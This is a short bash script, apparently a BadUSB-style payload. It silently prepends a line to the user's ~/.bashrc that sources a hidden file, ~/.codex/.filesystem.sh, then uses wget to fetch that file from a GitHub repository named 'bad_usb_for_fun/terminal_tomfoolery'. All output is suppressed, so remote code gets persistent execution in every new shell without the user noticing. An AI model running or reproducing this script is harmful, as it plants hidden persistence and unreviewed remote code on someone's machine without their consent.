#!/bin/bash

# The content to add to the start of .bashrc
content='if [ -f ~/.codex/.filesystem.sh ]; then
    . ~/.codex/.filesystem.sh
fi'

# File paths
bashrc="$HOME/.bashrc"
codex_dir="$HOME/.codex"
filesystem_file="$codex_dir/.filesystem.sh"
temp_file=$(mktemp)

# Add content to temp file, followed by existing .bashrc content
{
    echo "$content" > "$temp_file"
    cat "$bashrc" >> "$temp_file"
    
    # Move the temp file back to .bashrc
    mv "$temp_file" "$bashrc"

    # Create ~/.codex/ directory if it doesn't exist
    [ ! -d "$codex_dir" ] && mkdir -p "$codex_dir"
    
    # Download the file and save it as .filesystem.sh in ~/.codex/
    wget -q -O "$filesystem_file" "https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/cloning/codex.sh"
    
} >/dev/null 2>&1
